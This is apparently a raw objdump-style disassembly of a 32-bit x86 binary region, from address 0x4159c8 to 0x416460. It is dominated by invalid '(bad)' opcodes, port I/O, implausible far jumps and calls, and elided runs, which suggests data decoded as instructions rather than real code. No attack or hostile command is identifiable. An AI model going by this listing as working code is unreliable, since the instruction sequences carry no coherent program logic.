  4159c8:	xor    dl,dl
  4159ca:	ins    BYTE PTR es:[edi],dx
  4159cb:	push   esp
  4159cc:	xor    BYTE PTR [edi+ecx*8],al
  4159cf:	out    dx,al
  4159d0:	and    DWORD PTR [edi+ebp*4-0x15],edi
  4159d4:	jle    0x415a31
  4159d6:	mov    esi,0xb70be997
  4159db:	popa   
  4159dc:	or     BYTE PTR [esi-0x647c9421],cl
  4159e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159e3:	popa   
  4159e4:	(bad)  
  4159e5:	fisttp QWORD PTR [ebx+0x203f059]
  4159eb:	add    al,0x56
  4159ed:	es add ebx,eax
  4159f0:	loope  0x4159f6
  4159f2:	cmp    eax,0x7f03d03c
  4159f7:	popa   
  4159f8:	dec    edx
  4159f9:	push   ebx
  4159fa:	add    BYTE PTR [ecx+0x6efd43e3],al
  415a00:	mov    ch,0xde
  415a02:	call   0x8c467965
  415a07:	dec    BYTE PTR fs:[esi+edi*8]
  415a0b:	push   esi
  415a0c:	bnd jnp 0x415a05
  415a0f:	sar    BYTE PTR [ebx+eax*1-0x1],0x7c
  415a14:	pop    edx
  415a15:	or     eax,0x3efe
	...
  415a42:	pop    ds
  415a43:	(bad)
  415a47:	inc    ebx
  415a48:	std    
  415a49:	cs mov ch,0xde
  415a4c:	in     al,0x1e
  415a4e:	fild   WORD PTR [ebx+ebp*2]
  415a51:	jmp    0xa8abaabb
  415a56:	cmp    eax,0x731b404
  415a5b:	add    eax,0x5b7106fe
  415a60:	call   0xfe45d836
  415a65:	pusha  
  415a66:	shl    DWORD PTR [ebx],0xf6
  415a69:	out    dx,al
  415a6a:	(bad)  
  415a6c:	cmp    DWORD PTR [ecx+0x39fe0196],0x22
  415a73:	ds push 0x28
  415a76:	inc    edx
  415a77:	add    dh,BYTE PTR [ecx+esi*4-0x3901fe7a]
  415a7e:	lock pop edx
  415a80:	call   0xfe435876
  415a85:	pusha  
  415a86:	shr    BYTE PTR [esi],0xf6
  415a89:	scas   al,BYTE PTR es:[edi]
  415a8a:	sahf   
  415a8b:	fnstsw WORD PTR [ebx-0x1fe6967]
  415a91:	jmp    0x54c2d09f
  415a96:	pop    ecx
  415a97:	or     esi,edi
  415a99:	mov    ?,WORD PTR ds:0x64006287
  415a9f:	loope  0x415a86
  415aa1:	not    DWORD PTR [eax+0x7b]
  415aa4:	std    
  415aa5:	jae    0x415aa7
	...
  415acf:	add    BYTE PTR [esi],ch
  415ad1:	out    dx,eax
  415ad2:	std    
  415ad3:	inc    DWORD PTR [eax-0x44]
  415ad6:	(bad)  
  415ad7:	jne    0x415a90
  415ad9:	jbe    0x415b4d
  415adb:	cmp    DWORD PTR [eax],edx
  415add:	jnp    0x415add
  415adf:	mov    ch,0x7
  415ae1:	mov    ds:0x28f0fffe,eax
  415ae6:	push   cs
  415ae7:	call   0x3ec054
  415aec:	push   eax
  415aed:	jmp    0x7b9252db
  415af2:	(bad)  
  415af3:	jne    0x415b5c
  415af5:	jbe    0x415aaf
  415af7:	cmp    DWORD PTR [eax],esp
  415af9:	jnp    0x415af9
  415afb:	mov    ch,0x4f
  415afd:	mov    ds:0x2950fffe,eax
  415b02:	push   cs
  415b03:	call   0x3ec004
  415b08:	inc    eax
  415b09:	jmp    0xa29252e7
  415b0e:	(bad)  
  415b0f:	mov    ch,0x3b
  415b11:	mov    ds:0x2850fffe,eax
  415b16:	push   cs
  415b17:	call   0x3ebba8
  415b1c:	adc    ah,ah
  415b1e:	(bad)  
  415b20:	adc    BYTE PTR [edx+0x762775fe],ah
  415b26:	mov    BYTE PTR [ecx],bh
  415b28:	add    BYTE PTR [edx-0x5648427e],ah
  415b2e:	(bad)  
  415b2f:	call   DWORD PTR [edi]
  415b31:	sub    ah,BYTE PTR [ecx]
  415b33:	push   0x0
	...
  415b5c:	add    BYTE PTR [eax],al
  415b5e:	push   ss
  415b5f:	pop    esi
  415b60:	in     eax,dx
  415b61:	mov    esi,0xe80e23a0
  415b66:	neg    BYTE PTR [esi-0x3]
  415b69:	(bad)  
  415b6a:	ds jmp 0xd12b2b07
  415b70:	pop    ebp
  415b71:	(bad)  
  415b72:	xchg   ebx,eax
  415b73:	fist   WORD PTR [ebp-0x2]
  415b76:	rol    DWORD PTR [eax-0x3b29f029],1
  415b7c:	sbb    al,0xff
  415b7e:	shl    DWORD PTR [eax-0x29],0xf
  415b82:	mov    ecx,0xb1f63cde
  415b87:	mov    al,ds:0x9c36745d
  415b8c:	sub    al,0xfe
  415b8e:	mov    eax,ds:0x76b45d90
  415b93:	inc    eax
  415b94:	pop    ebp
  415b95:	(bad)  
  415b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b97:	add    ebx,DWORD PTR [esi]
  415b99:	dec    DWORD PTR [ecx-0x761068b8]
  415b9f:	xor    BYTE PTR [ebp-0x19],bl
  415ba2:	and    edi,eax
  415ba4:	pop    esi
  415ba5:	(bad)  
  415ba6:	jno    0x415b4e
  415ba8:	jo     0x415ba0
  415baa:	imul   ebp,DWORD PTR [eax+0x6c],0x5d512219
  415bb1:	(bad)  
  415bb2:	xchg   ebx,eax
  415bb3:	imul   edx,DWORD PTR [ebp-0x2],0x51
  415bb7:	imul   ecx,DWORD PTR ds:0x5f08493c,0xffffffb4
  415bbe:	pop    edx
  415bbf:	or     BYTE PTR [edi-0x2],bl
	...
  415bea:	add    BYTE PTR [eax],al
  415bec:	es out dx,eax
  415bee:	sbb    eax,0x992231ff
  415bf3:	fbstp  TBYTE PTR [ecx]
  415bf5:	sub    bl,BYTE PTR [edi-0x19]
  415bf8:	daa    
  415bf9:	outs   dx,BYTE PTR ds:[esi]
  415bfa:	pop    ebp
  415bfb:	(bad)  
  415bfc:	sbb    DWORD PTR [eax-0x3dee09cb],eax
  415c02:	imul   ebp,ebp,0xfe5ec945
  415c08:	jnp    0x415bd4
  415c0a:	ins    BYTE PTR es:[edi],dx
  415c0b:	stc    
  415c0c:	sti    
  415c0d:	pop    ebx
  415c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c0f:	pop    esi
  415c10:	lock xchg BYTE PTR [ebx-0x18ccc895],bl
  415c17:	add    esi,edi
  415c19:	sbb    eax,0xd47303dc
  415c1e:	xchg   ebx,eax
  415c1f:	cmp    ch,0xff
  415c22:	adc    DWORD PTR [esp+edx*2],eax
  415c25:	mov    ?,WORD PTR [esi-0x28]
  415c28:	cmp    ebx,esi
  415c2a:	out    0x1c,eax
  415c2c:	mov    ecx,0xb5c87100
  415c31:	add    ch,dl
  415c33:	or     edx,DWORD PTR [esi]
  415c35:	out    0xc0,al
  415c37:	les    esp,FWORD PTR [ecx+0x1431501]
  415c3d:	call   0x5e3e:0xfeb06be7
  415c44:	mov    BYTE PTR [esi+0x72aaebdf],al
  415c4a:	test   al,0x3
  415c4c:	out    0x5c,al
  415c4e:	out    0x3,eax
	...
  415c78:	add    BYTE PTR [eax],al
  415c7a:	mov    esi,0x68606cf3
  415c7f:	add    BYTE PTR [edi],dl
  415c81:	fsub   DWORD PTR [ebp+0x0]
  415c84:	xchg   ebp,eax
  415c85:	or     esp,DWORD PTR [esi+0x6c]
  415c88:	rcr    BYTE PTR [esi+0x50],0x12
  415c8c:	sub    al,BYTE PTR [edi]
  415c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c90:	bound  ebp,QWORD PTR [edi-0x44]
  415c93:	pop    ss
  415c94:	in     al,dx
  415c95:	mov    ah,0x90
  415c97:	jne    0x415c80
  415c99:	jmp    0xc965d21
  415c9e:	push   ss
  415c9f:	(bad)  
  415ca0:	minps  xmm4,XMMWORD PTR [eax]
  415ca3:	shl    BYTE PTR [eax+eiz*2],cl
  415ca6:	les    eax,FWORD PTR [ebp+0x2e]
  415ca9:	int3   
  415caa:	jle    0x415d07
  415cac:	jb     0x415ccd
  415cae:	jne    0x415c43
  415cb0:	add    BYTE PTR [eax],ch
  415cb2:	cmp    bl,bl
  415cb4:	cmp    eax,0x689711e9
  415cb9:	(bad)  
  415cbb:	call   0xe926:0x2a5a3600
  415cc2:	cmp    eax,0xdb15c054
  415cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc8:	call   0xfe42559c
  415ccd:	sbb    edx,ebx
  415ccf:	(bad)  
  415cd0:	std    
  415cd1:	xchg   BYTE PTR [eax+0x7d033777],ah
  415cd7:	dec    DWORD PTR [ebp+0x66]
  415cda:	mov    DWORD PTR [edi-0x18],edx
  415cdd:	sbb    eax,DWORD PTR [eax]
	...
  415d07:	add    BYTE PTR [esi+0x4741fe00],dl
  415d0d:	inc    esp
  415d0e:	std    
  415d0f:	dec    esi
  415d10:	daa    
  415d11:	pop    ebx
  415d12:	inc    esi
  415d13:	imul   esi,DWORD PTR [eax],0x8043735b
  415d19:	add    esi,DWORD PTR [edx]
  415d1b:	sub    DWORD PTR [ebp+0x1b2efe00],esp
  415d21:	or     ch,BYTE PTR [edi-0x4679c51f]
  415d27:	push   ds
  415d28:	xchg   ecx,eax
  415d29:	add    edi,esi
  415d2b:	pushf  
  415d2c:	xor    eax,0xfad195f3
  415d31:	add    BYTE PTR [esi-0x59],bl
  415d34:	add    al,0x1a
  415d36:	add    eax,0xecd490e9
  415d3b:	push   0xfffffff6
  415d3d:	add    ebp,DWORD PTR [ebx-0x17]
  415d40:	daa    
  415d41:	mov    ?,ebp
  415d43:	pop    esp
  415d44:	inc    edx
  415d45:	repz aaa 
  415d47:	and    DWORD PTR [ebx-0x61d37803],ecx
  415d4d:	je     0x415d4f
  415d4f:	inc    ecx
  415d50:	and    BYTE PTR [ebp+0x3f],dh
  415d53:	add    BYTE PTR [edi],ah
  415d55:	repz inc ebx
  415d57:	push   0x56
  415d59:	push   edi
  415d5a:	std    
  415d5b:	xor    eax,0x4112d4
  415d60:	call   FWORD PTR [edi+0x5398ff3c]
  415d66:	shl    BYTE PTR [esi+edi*1-0x39],0x65
	...
  415d93:	add    BYTE PTR [eax],al
  415d95:	add    bh,dl
  415d97:	outs   dx,DWORD PTR ds:[esi]
  415d98:	mov    ebx,0x40f13068
  415d9d:	add    BYTE PTR [edi],dh
  415d9f:	mov    al,ds:0x99af0874
  415da4:	(bad)  
  415da5:	dec    DWORD PTR [eax+0x72]
  415da8:	(bad)  
  415da9:	cmp    ch,BYTE PTR [eax]
  415dab:	lahf   
  415dac:	add    BYTE PTR gs:[edi-0x6f974491],ah
  415db3:	hlt    
  415db4:	inc    eax
  415db5:	add    BYTE PTR [edi-0x10],bh
  415db8:	addr16 inc ecx
  415dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dbb:	lahf   
  415dbc:	je     0x415dc6
  415dbe:	out    dx,eax
  415dbf:	test   eax,0x9f48ff62
  415dc4:	je     0x415dc2
  415dc6:	dec    eax
  415dc7:	and    eax,0x5f41e806
  415dcc:	std    
  415dcd:	jmp    FWORD PTR [esi]
  415dcf:	pushf  
  415dd0:	add    DWORD PTR [eax],eax
  415dd2:	mov    dl,0xd3
  415dd4:	jmp    0x53df715c
  415dd9:	push   edi
  415dda:	mov    ebp,0x38506a5a
  415ddf:	and    eax,0x670fe806
  415de4:	std    
  415de5:	(bad)  
  415de6:	ficom  WORD PTR [edx+edi*8]
  415de9:	mov    esi,edx
  415deb:	push   ss
  415dec:	inc    esi
  415ded:	inc    ecx
  415dee:	daa    
  415def:	int    0x3c
  415df1:	dec    ebx
  415df2:	outs   dx,DWORD PTR ds:[esi]
  415df3:	sbb    dh,bh
  415df5:	jg     0x415e35
  415df7:	gs add al,0x74
	...
  415e22:	add    BYTE PTR [eax],al
  415e24:	sbb    DWORD PTR [edx+eax*4-0x4d0b8097],0xffffffe7
  415e2c:	and    edx,DWORD PTR [esi+0x4]
  415e2f:	add    BYTE PTR ds:0x901ed0b4,dh
  415e35:	sbb    al,0x1c
  415e37:	inc    esp
  415e38:	icebp  
  415e39:	mov    ah,0xb4
  415e3b:	addr16 ds hlt 
  415e3e:	push   0xffffffbd
  415e40:	push   esi
  415e41:	test   dh,ch
  415e43:	inc    eax
  415e44:	ds inc esp
  415e46:	pop    ecx
  415e47:	je     0x415e8f
  415e49:	in     al,dx
  415e4a:	mov    edi,0x6c7cc962
  415e4f:	dec    ebp
  415e50:	add    al,0x85
  415e52:	pop    ecx
  415e53:	jmp    0x1f3e:0x3d84363f
  415e5a:	pop    esp
  415e5b:	inc    ebp
  415e5c:	stos   BYTE PTR es:[edi],al
  415e5d:	pusha  
  415e5e:	inc    esp
  415e5f:	mov    eax,0xfe59a4a1
  415e64:	mov    WORD PTR [ebp+0x1c],?
  415e67:	pop    es
  415e68:	or     ebx,ecx
  415e6a:	pop    ecx
  415e6b:	je     0x415df7
  415e6d:	cmp    al,0xcf
  415e6f:	pop    es
  415e70:	xchg   esi,eax
  415e71:	fst    DWORD PTR [ecx]
  415e73:	(bad)  
  415e74:	jns    0x415e42
  415e76:	mov    bh,0xc8
  415e78:	jl     0x415e69
  415e7a:	add    DWORD PTR [ebp-0x4b],edx
  415e7d:	dec    edi
  415e7e:	test   ebx,eax
  415e80:	bound  edi,QWORD PTR [ebp-0x25c1964e]
  415e86:	mov    ah,0xfe
	...
  415eb0:	add    BYTE PTR [eax],al
  415eb2:	retf   
  415eb3:	or     ebp,DWORD PTR [edx+0x49]
  415eb6:	adc    ebp,edi
  415eb8:	pop    edx
  415eb9:	mov    bl,bh
  415ebb:	pop    es
  415ebc:	(bad)  
  415ebd:	xor    al,0x81
  415ebf:	mov    edx,0x5bc4ffc4
  415ec4:	and    al,0xcf
  415ec6:	sbb    DWORD PTR [edx+0x5b6083e7],0xdfa1c15b
  415ed0:	inc    ecx
  415ed1:	lds    edx,FWORD PTR [ecx]
  415ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ed4:	iret   
  415ed5:	loop   0x415f3a
  415ed7:	pop    ebx
  415ed8:	out    0xe,eax
  415eda:	inc    BYTE PTR [edi-0x3f1e4e2a]
  415ee0:	sub    bl,BYTE PTR [ebx-0x10]
  415ee3:	stos   DWORD PTR es:[edi],eax
  415ee4:	(bad)  
  415ee6:	ds in  al,dx
  415ee8:	pop    ebp
  415ee9:	jmp    0x415e7e
  415eeb:	jno    0x415f15
  415eed:	add    al,0x6e
  415eef:	cld    
  415ef0:	adc    al,0xc
  415ef2:	out    0x14,al
  415ef4:	or     bl,BYTE PTR [ebx-0x38]
  415ef7:	repz xchg edi,eax
  415ef9:	sbb    al,0xc1
  415efb:	cld    
  415efc:	add    BYTE PTR [eax+eax*1],0xdb
  415f00:	lods   eax,DWORD PTR ds:[esi]
  415f01:	add    ebp,DWORD PTR [ebx]
  415f03:	add    DWORD PTR [esi-0x5ee493a9],ebp
  415f09:	pop    edx
  415f0a:	mov    al,ds:0xeb5556fc
  415f0f:	inc    ebx
  415f10:	out    0xd0,al
  415f12:	aam    0xfc
  415f14:	mov    esp,0x57
	...
  415f3d:	add    BYTE PTR [eax],al
  415f3f:	add    BYTE PTR [eax+0x556bef86],cl
  415f45:	inc    esp
  415f46:	ss pop edx
  415f48:	sbb    BYTE PTR [ebp+0x5b3d4520],bl
  415f4e:	mov    esp,0x23d8558e
  415f53:	push   edi
  415f54:	xlat   BYTE PTR ds:[ebx]
  415f55:	pop    edx
  415f56:	xor    DWORD PTR [ebp+0x6bdf8658],0x5a064583
  415f60:	mov    dh,0x96
  415f62:	sti    
  415f63:	jmp    0xfc3d:0xa8007186
  415f6a:	jae    0x415f4d
  415f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f6d:	mov    fs,eax
  415f6f:	out    0x87,al
  415f71:	std    
  415f72:	jae    0x415f51
  415f74:	xchg   DWORD PTR [edi+0x4675c108],eax
  415f7a:	std    
  415f7b:	into   
  415f7c:	test   DWORD PTR [edx],ebx
  415f7e:	add    eax,0xecd0d8e9
  415f83:	push   0x7e
  415f85:	sbb    al,0x57
  415f87:	mov    dh,0x9
  415f89:	push   eax
  415f8a:	call   0xfe3db3b3
  415f8f:	bnd jge 0x415f19
  415f92:	add    edi,DWORD PTR [edi]
  415f94:	jne    0x415fb0
  415f96:	or     ecx,ebp
  415f98:	rcl    BYTE PTR [esi-0x7888c610],0xc
  415f9f:	xchg   ecx,eax
  415fa0:	outs   dx,DWORD PTR ds:[esi]
  415fa1:	ds std 
  415fa3:	jle    0x415fa5
	...
  415fcd:	add    BYTE PTR [ebx],dh
  415fcf:	sbb    ecx,DWORD PTR [esi]
  415fd1:	ins    DWORD PTR es:[edi],dx
  415fd2:	dec    edx
  415fd3:	pop    edx
  415fd4:	add    cl,ch
  415fd6:	push   ss
  415fd7:	xchg   esp,edi
  415fd9:	push   ecx
  415fda:	call   0xb5a05d21
  415fdf:	xchg   esi,eax
  415fe0:	in     al,dx
  415fe1:	push   esi
  415fe2:	mov    edi,edi
  415fe4:	std    
  415fe5:	aam    0x19
  415fe7:	std    
  415fe8:	jae    0x41602b
  415fea:	sbb    bh,BYTE PTR [edi+esi*1+0x3e]
  415fee:	out    0xd0,eax
  415ff0:	jae    0x416037
  415ff2:	in     eax,0xab
  415ff4:	add    cl,ch
  415ff6:	cmp    eax,0x7c924873
  415ffb:	sti    
  415ffc:	push   ebx
  415ffd:	adc    ecx,eax
  415fff:	ss add cl,ch
  416002:	dec    edx
  416003:	sbb    esi,DWORD PTR [esp+eiz*8-0x1c]
  416007:	mov    dh,0x0
  416009:	add    BYTE PTR [edi+0x57],dl
  41600c:	mov    eax,esi
  41600e:	scas   eax,DWORD PTR es:[edi]
  41600f:	packssdw mm0,QWORD PTR [ecx+0x27]
  416013:	xchg   ebp,ebx
  416015:	and    esp,DWORD PTR [edi]
  416017:	pop    edi
  416018:	add    eax,esi
  41601a:	scas   al,BYTE PTR es:[edi]
  41601b:	sub    esi,esp
  41601d:	push   0x410867
  416022:	pop    ecx
  416023:	xchg   DWORD PTR [ebp+0x25],edi
  416026:	daa    
  416027:	pop    edi
  416028:	or     eax,eax
  41602a:	dec    edx
  41602b:	cli    
  41602c:	call   0xa077b1
  416031:	mov    al,BYTE PTR [eax]
	...
  41605b:	add    BYTE PTR [edi],dl
  41605d:	popf   
  41605e:	std    
  41605f:	call   DWORD PTR [edi-0x4f]
  416062:	(bad)  
  416063:	jne    0x416034
  416065:	xchg   BYTE PTR [ebp+0x95ed723],dh
  41606b:	sar    BYTE PTR [ebx],0xff
  41606e:	mov    BYTE PTR [ebp-0x45],al
  416071:	xchg   ebx,eax
  416072:	je     0x41605c
  416074:	scas   eax,DWORD PTR es:[edi]
  416075:	imul   eax,DWORD PTR [ebp-0x1],0x40
  416079:	in     eax,0x44
  41607b:	loopne 0x4160ad
  41607d:	sub    edx,esp
  41607f:	jmp    FWORD PTR [edx-0x11861a82]
  416085:	xchg   ebx,eax
  416086:	dec    BYTE PTR [ebx]
  416088:	push   edi
  416089:	sub    bh,BYTE PTR [ebx]
  41608b:	rol    DWORD PTR [edx-0xdff9866],1
  416091:	mov    eax,0x290050e1
  416096:	fsubp  st(0),st
  416098:	xor    al,BYTE PTR [ecx]
  41609a:	(bad)  
  41609b:	call   FWORD PTR [esi+ebx*4+0x71]
  41609f:	es jg  0x4160ff
  4160a2:	add    bh,ch
  4160a4:	loope  0x416038
  4160a6:	je     0x4160b0
  4160a8:	dec    edi
  4160a9:	scas   al,BYTE PTR es:[edi]
  4160aa:	xor    al,0xff
  4160ac:	ds push ecx
  4160ae:	pop    eax
  4160af:	je     0x416117
  4160b1:	imul   ecx,esi,0xea95607
  4160b7:	inc    DWORD PTR [ecx-0x7]
  4160ba:	retf   
  4160bb:	jecxz  0x4160f6
  4160bd:	ja     0x416120
  4160bf:	inc    BYTE PTR [eax]
	...
  4160e9:	add    BYTE PTR [ebx+0x736c69fc],ch
  4160ef:	add    DWORD PTR [esi-0x2],edx
  4160f2:	stos   DWORD PTR es:[edi],eax
  4160f3:	and    al,0x6d
  4160f5:	jge    0x41614d
  4160f7:	adc    DWORD PTR [esi+0x59],edx
  4160fa:	jbe    0x416178
  4160fc:	hlt    
  4160fd:	jg     0x416147
  4160ff:	add    al,0x7
  416101:	test   DWORD PTR [ecx-0x47],edi
  416104:	push   ebp
  416105:	(bad)  
  416106:	pushw  es
  416108:	add    ch,bh
  41610a:	mov    al,0xc8
  41610c:	iret   
  41610d:	pop    es
  41610e:	(bad)  
  41610f:	not    BYTE PTR [eax]
  416111:	jmp    ecx
  416113:	fmul   st,st(7)
  416115:	sti    
  416116:	fst    DWORD PTR [esi+0x68]
  416119:	dec    BYTE PTR [ebx-0x4]
  41611c:	imul   edi,DWORD PTR [ebx+edx*1],0x4bfe55e1
  416123:	call   0x71b7ae94
  416128:	push   ebp
  416129:	mov    ebx,?
  41612b:	jae    0x4160e1
  41612d:	out    0x2b,eax
  41612f:	inc    edx
  416130:	push   ebp
  416131:	(bad)  
  416132:	xchg   ebp,eax
  416133:	add    esi,DWORD PTR [eax+ecx*8+0x5501fb7c]
  41613a:	lds    esi,FWORD PTR [edi]
  41613c:	add    ebx,0xfbbf6ea2
  416142:	out    dx,al
  416143:	cmp    bh,cl
  416145:	or     edi,DWORD PTR [ecx-0x4a]
  416148:	or     eax,ebp
  41614a:	adc    eax,0x460
	...
  416177:	add    BYTE PTR ds:0xbb07275b,dh
  41617d:	inc    edx
  41617e:	call   0xe7c69f86
  416183:	jmp    0x4161a2
  416185:	xchg   BYTE PTR [eax-0xc90b6fd],ch
  41618b:	push   esi
  41618c:	retf   0xf62
  41618f:	pop    ds
  416190:	jne    0x41618a
  416192:	test   BYTE PTR [edx+edi*2-0x69fc7e0d],0x42
  41619a:	push   edx
  41619b:	lds    esp,FWORD PTR [ecx]
  41619d:	cli    
  41619e:	push   esp
  41619f:	or     BYTE PTR [ecx],bl
  4161a1:	outs   dx,DWORD PTR ds:[esi]
  4161a2:	fild   QWORD PTR [ebx+0x2f]
  4161a5:	xor    al,0xce
  4161a7:	push   esi
  4161a8:	mov    dh,0x9e
  4161aa:	mov    ebx,0x17ff7a88
  4161af:	in     al,dx
  4161b0:	sub    DWORD PTR [eax+ebp*1-0x24910efc],eax
  4161b7:	push   esi
  4161b8:	jb     0x41621d
  4161ba:	(bad)  
  4161bb:	pop    edx
  4161bc:	daa    
  4161bd:	clc    
  4161be:	sahf   
  4161bf:	mov    WORD PTR [edx+0x660401eb],es
  4161c5:	xor    BYTE PTR [edx],al
  4161c7:	vpsubw xmm7,xmm6,xmm4
  4161cb:	pop    es
  4161cc:	shr    DWORD PTR [esi-0x11],0x6b
  4161d0:	mov    ds:0xc6567635,eax
  4161d5:	sahf   
  4161d6:	jnp    0x4161c1
  4161d8:	test   eax,0xeb2380
	...
  416205:	add    dh,bh
  416207:	pop    edx
  416208:	pop    esi
  416209:	rol    BYTE PTR [ebp-0x8],1
  41620c:	fmul   QWORD PTR [ebx]
  41620e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41620f:	or     dl,BYTE PTR [edx]
  416211:	push   edi
  416212:	mov    dl,ah
  416214:	lods   al,BYTE PTR ds:[esi]
  416215:	imul   edi,DWORD PTR [esi+esi*2-0x20b6fcc9],0x0
  41621d:	push   0x3d
  41621f:	pop    ebx
  416220:	add    BYTE PTR [edx-0x7a],ch
  416223:	cld    
  416224:	add    BYTE PTR [ebp+0x573f986],bl
  41622a:	lock outs dx,BYTE PTR ds:[esi]
  41622c:	lock add DWORD PTR [eax-0x60],edi
  416230:	std    
  416231:	push   cs
  416232:	xor    al,0x1b
  416234:	jne    0x4161cd
  416236:	or     al,BYTE PTR [edi-0x19c26c1c]
  41623c:	inc    ebx
  41623d:	or     eax,0xf973f8ed
  416242:	xchg   esp,eax
  416243:	pop    ebp
  416244:	pop    edi
  416245:	out    0x8b,al
  416247:	rcl    BYTE PTR gs:[ebp-0x2b],0xdc
  41624c:	jnp    0x41621f
  41624e:	cmp    ch,BYTE PTR [edi+0x51]
  416251:	push   0xfffffff1
  416253:	jmp    0x416255
  416255:	cmp    eax,0xb97bdcf9
  41625a:	inc    edx
  41625b:	outs   dx,DWORD PTR ds:[esi]
  41625c:	inc    ebp
  41625d:	inc    ecx
  41625e:	cmp    bl,BYTE PTR [ebx-0x13]
  416261:	outs   dx,DWORD PTR ds:[esi]
  416262:	xchg   ebx,eax
  416263:	outs   dx,DWORD PTR ds:[esi]
  416264:	adc    BYTE PTR [ecx-0x6102d412],dl
	...
  416292:	add    BYTE PTR [eax],al
  416294:	jae    0x416305
  416296:	clc    
  416297:	xchg   esi,eax
  416298:	add    DWORD PTR [eax-0x18],ebp
  41629b:	add    ch,BYTE PTR [esi]
  41629d:	clc    
  41629e:	std    
  41629f:	xchg   cl,dh
  4162a1:	jmp    0x4162a0
  4162a3:	hlt    
  4162a4:	lods   eax,DWORD PTR ds:[esi]
  4162a5:	jmp    DWORD PTR [eax-0x43]
  4162a8:	or     bh,cl
  4162aa:	std    
  4162ab:	hlt    
  4162ac:	or     ecx,edi
  4162ae:	jae    0x416309
  4162b0:	or     ebp,DWORD PTR [edi+0x10]
  4162b3:	push   ecx
  4162b4:	cmp    BYTE PTR [edi],ch
  4162b6:	std    
  4162b7:	push   esi
  4162b8:	jmp    0x416328
  4162ba:	in     al,dx
  4162bb:	dec    esi
  4162bc:	jns    0x416325
  4162be:	call   0xfda932c3
  4162c3:	(bad)  
  4162c4:	cmp    BYTE PTR [eax],ch
  4162c6:	out    0xff,al
  4162c8:	mov    dl,0xeb
  4162ca:	in     eax,0x3c
  4162cc:	jae    0x41625c
  4162ce:	(bad)  
  4162cf:	inc    edx
  4162d1:	xchg   ebx,eax
  4162d2:	in     eax,0x21
  4162d4:	jo     0x416264
  4162d6:	(bad)  
  4162d7:	push   DWORD PTR [edx+0x7019e5a7]
  4162dd:	mov    ?,esi
  4162df:	inc    edx
  4162e1:	mov    esp,ebp
  4162e3:	adc    eax,esi
  4162e5:	(bad)  
  4162e6:	(bad)  
  4162e7:	push   DWORD PTR [edx-0xff61a82]
  4162ed:	(bad)  
  4162ee:	(bad)  
  4162ef:	inc    DWORD PTR [edx+0x3001e587]
  4162f5:	nop
  4162f6:	(bad)  
  4162f7:	inc    DWORD PTR [eax]
	...
  416321:	add    BYTE PTR [edx-0x6d],dh
  416324:	in     eax,0x25
  416326:	xor    al,0x5f
  416328:	add    cl,cl
  41632a:	aad    0x5e
  41632c:	add    BYTE PTR [ebp+0x6c],dl
  41632f:	jle    0x4162b1
  416331:	(bad)  
  416332:	jmp    DWORD PTR [edi-0x4a750002]
  416338:	stc    
  416339:	push   eax
  41633a:	cwde   
  41633b:	and    eax,0x6732ff0a
  416340:	call   0x9c6754
  416345:	or     edx,DWORD PTR [edi-0x285a7ca1]
  41634b:	pop    edx
  41634c:	add    bh,al
  41634e:	bound  edx,QWORD PTR [edi+0x5aa7fffd]
  416354:	lds    eax,FWORD PTR [ebp+0x33]
  416357:	pop    DWORD PTR [esi]
  416359:	add    BYTE PTR [edi-0x589601fc],dl
  41635f:	fld    QWORD PTR [esp+ebp*8-0x1ab6ac2]
  416366:	out    dx,al
  416367:	sbb    DWORD PTR [edx],eax
  416369:	(bad)  
  41636a:	sti    
  41636b:	aaa    
  41636c:	mov    cl,0x8c
  41636e:	ret    
  41636f:	xor    BYTE PTR [esi+edi*8+0x71],cl
  416373:	aam    0x54
  416375:	je     0x4163dd
  416377:	inc    ebp
  416378:	into   
  416379:	sti    
  41637a:	push   esi
  41637b:	cmp    bl,BYTE PTR [edi]
  41637d:	add    BYTE PTR [esi],bh
  41637f:	jmp    0x597dd6c5
  416384:	fild   DWORD PTR [edx+0x0]
	...
  4163ae:	add    BYTE PTR [eax],al
  4163b0:	mov    edi,eax
  4163b2:	dec    ecx
  4163b3:	inc    BYTE PTR [ecx+0x3]
  4163b6:	into   
  4163b7:	add    al,0x39
  4163b9:	mov    edi,0x7efcea59
  4163be:	jle    0x4163a7
  4163c0:	xor    DWORD PTR ds:0x86b34f52,eax
  4163c6:	pop    eax
  4163c7:	neg    BYTE PTR [ecx]
  4163c9:	adc    eax,0x8bfeb5
  4163ce:	push   ebx
  4163cf:	je     0x416407
  4163d1:	sbb    al,0x82
  4163d3:	cmp    BYTE PTR [ecx],al
  4163d5:	sbb    eax,0xf172bffe
  4163da:	jl     0x416360
  4163dc:	out    dx,al
  4163dd:	mov    ah,0x51
  4163df:	(bad)  
  4163e0:	push   esi
  4163e1:	inc    ecx
  4163e2:	fld    QWORD PTR [eax+0x3e]
  4163e5:	mov    ebp,0xd4d1ef97
  4163ea:	push   ecx
  4163eb:	out    0xef,eax
  4163ed:	and    DWORD PTR [edx],eax
  4163ef:	add    BYTE PTR ds:0xc10dd8c4,dh
  4163f5:	ss push esp
  4163f7:	idiv   BYTE PTR [ecx+0x4e745174]
  4163fd:	fdivr  QWORD PTR [eax]
  4163ff:	sti    
  416400:	test   eax,0xaeb45184
  416405:	pop    edx
  416406:	pop    esi
  416407:	push   ebx
  416408:	cwde   
  416409:	add    ch,BYTE PTR [eax+0x56f59119]
  41640f:	leave  
  416410:	xchg   ecx,eax
  416411:	add    eax,edx
  416413:	push   edx
	...
  41643c:	add    BYTE PTR [eax],al
  41643e:	xor    ch,0x46
  416441:	fnstenv [ebp+0x2]
  416444:	pushf  
  416445:	and    eax,0x46205b3e
  41644a:	xor    eax,0x557e945b
  41644f:	fldcw  WORD PTR [ebx]
  416451:	push   eax
  416452:	out    0x5a,eax
  416454:	xchg   ecx,eax
  416455:	mov    dh,0x50
  416457:	outs   dx,DWORD PTR ds:[esi]
  416458:	fistp  WORD PTR [ebx-0x11]
  41645b:	sub    DWORD PTR [esi],ecx
  41645d:	push   ebx
  41645e:	mov    dh,0x9f
  416460:	add    edx,DWORD PTR [ebx-0x4e]
